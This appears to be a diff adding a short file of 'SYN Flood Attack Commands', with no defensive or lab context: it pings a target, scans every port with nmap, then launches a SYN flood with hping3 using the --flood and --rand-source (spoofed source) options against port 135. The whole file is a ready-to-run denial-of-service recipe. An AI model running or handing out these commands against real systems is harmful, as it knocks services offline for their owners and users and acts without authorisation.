@@ -1,0 +1,10 @@
+# SYN Flood Attack Commands
+
+# Step 1: Check connectivity
+ping <target-ip>
+
+# Step 2: Scan open ports
+nmap -p- <target-ip>
+
+# Step 3: Launch SYN flood
+hping3 -V -S -p 135 --flood --rand-source <target-ip>
